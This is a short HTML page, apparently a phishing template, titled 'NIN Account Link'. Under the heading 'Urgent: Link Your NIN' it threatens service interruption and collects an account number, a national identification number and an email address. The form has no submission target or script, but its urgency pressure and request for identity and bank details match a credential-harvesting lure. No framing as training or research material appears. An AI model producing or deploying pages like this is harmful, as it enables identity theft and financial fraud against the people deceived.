<!DOCTYPE html>
<html>
<head>
    <title>NIN Account Link</title>
    <meta charset="UTF-8">
    <style>
        body { background: #f5f5f5; font-family: 'Verdana'; padding: 30px; }
        .box { max-width: 450px; margin: auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2); }
        h3 { text-align: center; color: #990000; }
        input, button { width: 100%; padding: 12px; margin-top: 12px; border: 1px solid #ccc; border-radius: 4px; }
        button { background-color: #990000; color: white; border: none; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Urgent: Link Your NIN</h3>
        <p>Failure to link NIN will result in service interruption.</p>
        <form>
            <input type="text" name="account" placeholder="Account Number" required>
            <input type="text" name="nin" placeholder="Your NIN" required>
            <input type="email" name="email" placeholder="Email Address">
            <button type="submit">Link Now</button>
        </form>
    </div>
</body>
</html>
